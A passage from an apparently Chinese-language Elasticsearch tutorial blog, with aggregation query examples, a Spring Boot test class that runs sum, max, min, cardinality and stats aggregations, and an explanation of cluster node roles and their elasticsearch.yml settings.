&quot;statsAll&quot;:&#123;  </span><br><span class=\"line\">      &quot;stats&quot;:&#123;  </span><br><span class=\"line\">        &quot;field&quot;:&quot;buyCount&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"10\">\n<li><strong>根据 createMonth 分组查询每个月的最大 buyCount</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;size&quot;:0,  </span><br><span class=\"line\">    &quot;aggs&quot;: &#123;  </span><br><span class=\"line\">    &quot;createMonthGroup&quot;: &#123;  </span><br><span class=\"line\">      &quot;terms&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;createMonth&quot;  </span><br><span class=\"line\">      &#125;,  </span><br><span class=\"line\">      &quot;aggs&quot;: &#123;  </span><br><span class=\"line\">        &quot;buyCountMax&quot;: &#123;  </span><br><span class=\"line\">          &quot;max&quot;: &#123;  </span><br><span class=\"line\">            &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">          &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"11\">\n<li><strong>查询每 createMonth 下，根据 sex 区分，统计buyCount 的平均值</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;size&quot;:0,  </span><br><span class=\"line\">    &quot;aggs&quot;: &#123;  </span><br><span class=\"line\">    &quot;createMonthGroup&quot;: &#123;  </span><br><span class=\"line\">      &quot;terms&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;createMonth&quot;  </span><br><span class=\"line\">      &#125;,  </span><br><span class=\"line\">      &quot;aggs&quot;: &#123;  </span><br><span class=\"line\">        &quot;sexGroup&quot;: &#123;  </span><br><span class=\"line\">          &quot;terms&quot;: &#123;  </span><br><span class=\"line\">            &quot;field&quot;: &quot;sex&quot;  </span><br><span class=\"line\">          &#125;,  </span><br><span class=\"line\">          &quot;aggs&quot;: &#123;  </span><br><span class=\"line\">                &quot;buyCountAvg&quot;: &#123;  </span><br><span class=\"line\">                    &quot;avg&quot;: &#123;  </span><br><span class=\"line\">                        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-2-2-ES客户端实现聚合查询\"><a href=\"#5-2-2-ES客户端实现聚合查询\" class=\"headerlink\" title=\"5.2.2 ES客户端实现聚合查询\"></a>5.2.2 ES客户端实现聚合查询</h3><p>测试代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">@SpringBootTest  </span><br><span class=\"line\">@Slf4j  </span><br><span class=\"line\">public class AggregationTest &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @Resource  </span><br><span class=\"line\">    ElasticsearchRestTemplate elasticsearchRestTemplate;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 查询 buyCount 的总和  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs1() &#123;  </span><br><span class=\"line\">        SumAggregationBuilder buyCountSum = AggregationBuilders.sum(&quot;buyCountSum&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withAggregations(buyCountSum)  </span><br><span class=\"line\">//                .addAggregation(buyCountSum)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Sum sum = aggregations.get(&quot;buyCountSum&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 总数：&#123;&#125; &quot;, sum.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 查询 2021-02 月 buyCount 的总和：  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs2() &#123;  </span><br><span class=\"line\">        QueryBuilder queryBuilder = QueryBuilders.termQuery(&quot;createMonth&quot;, &quot;2021-02&quot;);  </span><br><span class=\"line\">        SumAggregationBuilder buyCountSum = AggregationBuilders.sum(&quot;buyCountSum&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withQuery(queryBuilder)  </span><br><span class=\"line\">                .withAggregations(buyCountSum)  </span><br><span class=\"line\">//                .addAggregation(buyCountSum)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Sum sum = aggregations.get(&quot;buyCountSum&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 总数：&#123;&#125; &quot;, sum.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 查询 2021-03 月 buyCount 的最大值：  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs3() &#123;  </span><br><span class=\"line\">        QueryBuilder queryBuilder = QueryBuilders.termQuery(&quot;createMonth&quot;, &quot;2021-03&quot;);  </span><br><span class=\"line\">        MaxAggregationBuilder buyCountMax = AggregationBuilders.max(&quot;buyCountMax&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withQuery(queryBuilder)  </span><br><span class=\"line\">                .withAggregations(buyCountMax)  </span><br><span class=\"line\">//                .addAggregation(buyCountMax)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Max max = aggregations.get(&quot;buyCountMax&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 最大值：&#123;&#125; &quot;, max.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 查询 2021-03 月 buyCount 的最小值：  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs4() &#123;  </span><br><span class=\"line\">        QueryBuilder queryBuilder = QueryBuilders.termQuery(&quot;createMonth&quot;, &quot;2021-03&quot;);  </span><br><span class=\"line\">        MinAggregationBuilder buyCountMin = AggregationBuilders.min(&quot;buyCountMin&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withQuery(queryBuilder)  </span><br><span class=\"line\">                .withAggregations(buyCountMin)  </span><br><span class=\"line\">//                .addAggregation(buyCountMin)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Min min = aggregations.get(&quot;buyCountMin&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 最小值：&#123;&#125; &quot;, min.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 同时查询 2021-03 月 buyCount 的最大值和最小值：  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs5() &#123;  </span><br><span class=\"line\">        QueryBuilder queryBuilder = QueryBuilders.termQuery(&quot;createMonth&quot;, &quot;2021-03&quot;);  </span><br><span class=\"line\">        MaxAggregationBuilder buyCountMax = AggregationBuilders.max(&quot;buyCountMax&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        MinAggregationBuilder buyCountMin = AggregationBuilders.min(&quot;buyCountMin&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withQuery(queryBuilder)  </span><br><span class=\"line\">                .withAggregations(buyCountMax)  </span><br><span class=\"line\">                .withAggregations(buyCountMin)  </span><br><span class=\"line\">//                .addAggregation(buyCountMax)  </span><br><span class=\"line\">//                .addAggregation(buyCountMin)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Max max = aggregations.get(&quot;buyCountMax&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 最大值：&#123;&#125; &quot;, max.getValue());  </span><br><span class=\"line\">                Min min = aggregations.get(&quot;buyCountMin&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 最小值：&#123;&#125; &quot;, min.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 查询所有 name 的去重后的数量  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs6() &#123;  </span><br><span class=\"line\">        CardinalityAggregationBuilder distinctName = AggregationBuilders.cardinality(&quot;distinctName&quot;).field(&quot;name.keyword&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withAggregations(distinctName)  </span><br><span class=\"line\">//                .addAggregation(distinctName)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Cardinality cardinality = aggregations.get(&quot;distinctName&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 name 的去重后的数量：&#123;&#125; &quot;, cardinality.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\*  查询 2021-04 月 name 的去重后的数量  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs7() &#123;  </span><br><span class=\"line\">        QueryBuilder queryBuilder = QueryBuilders.termQuery(&quot;createMonth&quot;, &quot;2021-04&quot;);  </span><br><span class=\"line\">        CardinalityAggregationBuilder distinctName = AggregationBuilders.cardinality(&quot;distinctName&quot;).field(&quot;name.keyword&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withQuery(queryBuilder)  </span><br><span class=\"line\">                .withAggregations(distinctName)  </span><br><span class=\"line\">//                .addAggregation(distinctName)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Cardinality cardinality = aggregations.get(&quot;distinctName&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 name 的去重后的数量：&#123;&#125; &quot;, cardinality.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 查询 BuyCount 的平均值  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs8() &#123;  </span><br><span class=\"line\">        AvgAggregationBuilder buyCountAvg = AggregationBuilders.avg(&quot;buyCountAvg&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withAggregations(buyCountAvg)  </span><br><span class=\"line\">//                .addAggregation(buyCountAvg)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Avg avg = aggregations.get(&quot;buyCountAvg&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 的平均值：&#123;&#125; &quot;, avg.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 一次查询 总数，最大值，最小值，平均值，总和  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs9() &#123;  </span><br><span class=\"line\">        StatsAggregationBuilder stats = AggregationBuilders.stats(&quot;stats&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withAggregations(stats)  </span><br><span class=\"line\">//                .addAggregation(stats)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Stats s = aggregations.get(&quot;stats&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 的 count：&#123;&#125; &quot;, s.getCount());  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 的 min：&#123;&#125; &quot;, s.getMin());  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 的 max：&#123;&#125; &quot;, s.getMax());  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 的 avg：&#123;&#125; &quot;, s.getAvg());  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 的 sum：&#123;&#125; &quot;, s.getSum());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 根据 createMonth 分组查询每个月的最大 buyCount  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs10() &#123;  </span><br><span class=\"line\">        TermsAggregationBuilder createMonthGroup = AggregationBuilders.terms(&quot;createMonthGroup&quot;).field(&quot;createMonth&quot;)  </span><br><span class=\"line\">                .subAggregation(AggregationBuilders.max(&quot;buyCountMax&quot;).field(&quot;buyCount&quot;));  </span><br><span class=\"line\">  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withAggregations(createMonthGroup)  </span><br><span class=\"line\">//                .addAggregation(createMonthGroup)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Terms terms = aggregations.get(&quot;createMonthGroup&quot;);  </span><br><span class=\"line\">                terms.getBuckets().forEach(bucket -&gt; &#123;  </span><br><span class=\"line\">                    String createMonth = bucket.getKeyAsString();  </span><br><span class=\"line\">                    Aggregations subAggs = bucket.getAggregations();  </span><br><span class=\"line\">                    if (Objects.nonNull(subAggs)) &#123;  </span><br><span class=\"line\">                        Max max = subAggs.get(&quot;buyCountMax&quot;);  </span><br><span class=\"line\">                        log.info(&quot;计算 &#123;&#125; 月的最大值为：&#123;&#125; &quot;, createMonth, max.getValue());  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;);  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\*  查询每 createMonth 下，根据 sex 区分，统计buyCount 的平均值  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs11() &#123;  </span><br><span class=\"line\">        TermsAggregationBuilder createMonthGroup = AggregationBuilders.terms(&quot;createMonthGroup&quot;).field(&quot;createMonth&quot;)  </span><br><span class=\"line\">                .subAggregation(AggregationBuilders.terms(&quot;sexGroup&quot;).field(&quot;sex&quot;)  </span><br><span class=\"line\">                        .subAggregation(AggregationBuilders.avg(&quot;buyCountAvg&quot;).field(&quot;buyCount&quot;)));  </span><br><span class=\"line\">  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withAggregations(createMonthGroup)  </span><br><span class=\"line\">//                .addAggregation(createMonthGroup)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Terms terms = aggregations.get(&quot;createMonthGroup&quot;);  </span><br><span class=\"line\">                terms.getBuckets().forEach(bucket -&gt; &#123;  </span><br><span class=\"line\">                    String createMonth = bucket.getKeyAsString();  </span><br><span class=\"line\">                    Aggregations sexAggs = bucket.getAggregations();  </span><br><span class=\"line\">                    if (Objects.nonNull(sexAggs)) &#123;  </span><br><span class=\"line\">                        Terms sexTerms = sexAggs.get(&quot;sexGroup&quot;);  </span><br><span class=\"line\">                        sexTerms.getBuckets().forEach(sexBucket -&gt; &#123;  </span><br><span class=\"line\">                            String sex = sexBucket.getKeyAsString();  </span><br><span class=\"line\">                            Aggregations avgAggs = sexBucket.getAggregations();  </span><br><span class=\"line\">                            if (Objects.nonNull(avgAggs)) &#123;  </span><br><span class=\"line\">                                Avg avg = avgAggs.get(&quot;buyCountAvg&quot;);  </span><br><span class=\"line\">                                log.info(&quot;计算 &#123;&#125; 月，&#123;&#125; 性 的平均值为：&#123;&#125; &quot;, createMonth, sex, avg.getValue());  </span><br><span class=\"line\">                            &#125;  </span><br><span class=\"line\">                        &#125;);  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;);  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"5-3-ES-ES工业级Java-应用开发\"><a href=\"#5-3-ES-ES工业级Java-应用开发\" class=\"headerlink\" title=\"5.3 ES ES工业级Java 应用开发\"></a>5.3 ES ES工业级Java 应用开发</h2><p>一般不会直接使用RestHighLevelClient对于ES操作，因为语法过于繁琐，重复，基于分离变和不变的原则可以进行工业级封装。</p>\n<p><a href=\"http://localhost:8080/doc.html\">http://localhost:8080/doc.html</a></p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/22.png\"><br>工业级封装后的Service：</p>\n<blockquote>\n<p>文章实在太长， 这里省略了500字+， 省略的内容请参见的免费电子书 PDF版本《ES学习圣经：从0到1, 精通 ElasticSearch 工业级使用 》</p>\n</blockquote>\n<h1 id=\"6-ES集群架构\"><a href=\"#6-ES集群架构\" class=\"headerlink\" title=\"6 ES集群架构\"></a>6 ES集群架构</h1><h2 id=\"6-1-ES集群的5大角色\"><a href=\"#6-1-ES集群的5大角色\" class=\"headerlink\" title=\"6.1 ES集群的5大角色\"></a>6.1 ES集群的5大角色</h2><ol>\n<li><strong>Master Node ：主节点</strong></li>\n</ol>\n<p>主节点，该节点不和应用创建连接，每个节点都保存了集群状态。master节点控制整个集群的元数据。只有Master Node节点可以修改节点状态信息，及元数据(metadata)的处理。 元数据(metadata)，比如：</p>\n<ul>\n<li><p>索引的分片信息 、主副本信息</p>\n</li>\n<li><p>分片的节点分配信息，路由分配</p>\n</li>\n<li><p>index 、type、Mapping</p>\n</li>\n<li><p>Setting 配置等等。</p>\n</li>\n</ul>\n<p>从资源占用的角度来说：master节点不占用磁盘IO和CPU，内存使用量一般， 没有data 节点高类似于kafa中的 controller，负责集群元数据的管理和维护</p>\n<ol start=\"2\">\n<li><p><strong>Master eligible nodes ：合格节点</strong> 有资格成为Master节点但暂时并不是Master的节点被称为 eligible 节点，该节点可以参加选主流程，成为Master节点. 该节点只是与集群保持心跳，判断Master是否存活，如果Master故障则参加新一轮的Master选举。 从资源占用的角度来说：eligible节点比Master节点更节省资源，因为它还未成为 Master 节点， 只是有资格成功Master节点。</p>\n</li>\n<li><p><strong>Data Node ：数据节点</strong> 职责： 数据节点，用于建立文档索引，管理shard。 类似于rocket 中的 broker，负责数据的管理和维护，数据节点职责：</p>\n</li>\n</ol>\n<ul>\n<li><p>该节点用于建立文档索引， 接收 应用创建连接、接收索引请求</p>\n</li>\n<li><p>查询，接收用户的搜索请求</p>\n</li>\n</ul>\n<p>data节点的分片执行查询语句获得查询结果后将结果反馈给Coordinating节点，在查询的过程中非常消 耗硬件资源，如果在分片配置及优化没做好的情况下，进行一次查询非常缓慢(硬件配置也要跟上数据量)。 数据节点：保存包含索引文档的分片数据，执行CRUD、搜索、聚合相关的操作。属于：内存、CPU、IO密集型，对硬件资源要求高。 从资源占用的角度来说：data节点会占用大量的CPU、IO和内存</p>\n<ol start=\"4\">\n<li><strong>Coordinating Node ：协调节点(&#x2F;路由节点&#x2F;client节点)</strong></li>\n</ol>\n<p>协调节点，该节点专用与接收应用的查询连接、接受搜索请求，但其本身不负责存储数据 协调节点，接受客户端搜索请求后将请求转发到与查询条件相关的多个data节点的分片上，然后多个data节点的分片执行查询语句或者查询结果再返回给协调节点，协调节点把各个data节点的返回结果进行整合、排序等一系列操作后再将最终结果返回给用户请求。 data节点的分片执行查询语句获得查询结果后将结果反馈给Coordinating节点，在查询的过程中非常消耗硬件资源，如果在分片配置及优化没做好的情况下，进行一次查询非常缓慢(硬件配置也要跟上数据量)。 搜索请求在两个阶段中执行（query 和 fetch），这两个阶段由接收客户端请求的节点 - 协调节点协调。</p>\n<ul>\n<li><p>在请求query 阶段，协调节点将请求转发到保存数据的数据节点。每个数据节点在本地执行请求并将其结果返回给协调节点。</p>\n</li>\n<li><p>在收集fetch阶段，协调节点将每个数据节点的结果汇集为单个全局结果集。</p>\n</li>\n</ul>\n<p>从资源占用的角度来说：协调节点，可当负责均衡节点，该节点不占用io、cpu和内存 总结：Coordinating 大致的职责 ： 请求分发、结果的合并</p>\n<ol start=\"5\">\n<li><strong>Ingest Node ：ingest节点</strong></li>\n</ol>\n<p>ingest 节点可以看作是数据前置处理转换的节点，支持 pipeline管道 设置，可以使用 ingest 对数据进 行过滤、转换等操作，类似于 logstash 中 filter 的作用，功能相当强大。 Ingest节点处理时机——在数据被索引之前，通过预定义好的处理管道对数据进行预处理。默认情况下，所有节点都启用Ingest，因此任何节点都可以处理Ingest任务。 当然，我们也可以创建专用的Ingest节点。</p>\n<ol start=\"6\">\n<li><strong>部落（tribe）</strong></li>\n</ol>\n<p>接着说一下ES里面的部落：tribe， 可以在查询过程中链接两个集群的数据，查询的数据将会汇总到tribe节点，有tribe节点对数据进行整合再发送给client； tribe还可以写数据，但是这里有一个限制，就是写的索引只能是一个集群所有；如果写入两个集群同名索引，那么只能成功写入一个，至于写入哪一个可以通过配置偏好实现。 可以通过配置指明tribe只能读，不能写。</p>\n<h2 id=\"6-2-ES集群节点角色配置\"><a href=\"#6-2-ES集群节点角色配置\" class=\"headerlink\" title=\"6.2 ES集群节点角色配置\"></a>6.2 ES集群节点角色配置</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">1. node.master  </span><br><span class=\"line\">2. node.data  </span><br><span class=\"line\">3. node.ingest  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>配置实例&#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;config&#x2F;elasticsearch.yml</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">bootstrap.memory\\_lock: true  </span><br><span class=\"line\">cluster.name: &quot;es-cluster&quot;  </span><br><span class=\"line\">node.name: master1  </span><br><span class=\"line\">node.master: true  </span><br><span class=\"line\">node.data: true  </span><br><span class=\"line\">network.host: 0.0.0.0  </span><br><span class=\"line\">http.port: 9200  </span><br><span class=\"line\">transport.tcp.port: 9300  </span><br><span class=\"line\">cluster.initial\\_master\\_nodes: \\[&quot;master1&quot;\\]  </span><br><span class=\"line\">discovery.zen.ping.unicast.hosts: master1, master2, master3  </span><br><span class=\"line\">#官方推荐 master-eligible nodes / 2 + 1 向下取整的个数  </span><br><span class=\"line\">discovery.zen.minimum\\_master\\_nodes: 2  </span><br><span class=\"line\">path.logs: /usr/share/elasticsearch/logs  </span><br><span class=\"line\">http.cors.enabled: true  </span><br><span class=\"line\">http.cors.allow-origin: &quot;\\*&quot;  </span><br><span class=\"line\">xpack.security.audit.enabled: true  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>默认情况下这三个属性的值都是true，实际上，一个节点在默认情况下会同时扮演：Master Node，Data Node 和 Ingest Node。</p>\n<table>\n<thead>\n<tr>\n<th><strong>节点类型</strong></th>\n<th><strong>配置参数</strong></th>\n<th><strong>默认值</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Master Eligible</td>\n<td>node.master</td>\n<td>true</td>\n</tr>\n<tr>\n<td>Data</td>\n<td>node.data</td>\n<td>true</td>\n</tr>\n<tr>\n<td>Coordinating only</td>\n<td>无</td>\n<td></td>\n</tr>\n</tbody></table>\n<p>设置上面2 个参数全为 false，节点为专用协调节点</p>\n<p>|| Ingest| node.ingest| true|</p>\n<h2 id=\"6-3-ES节点配置组合\"><a 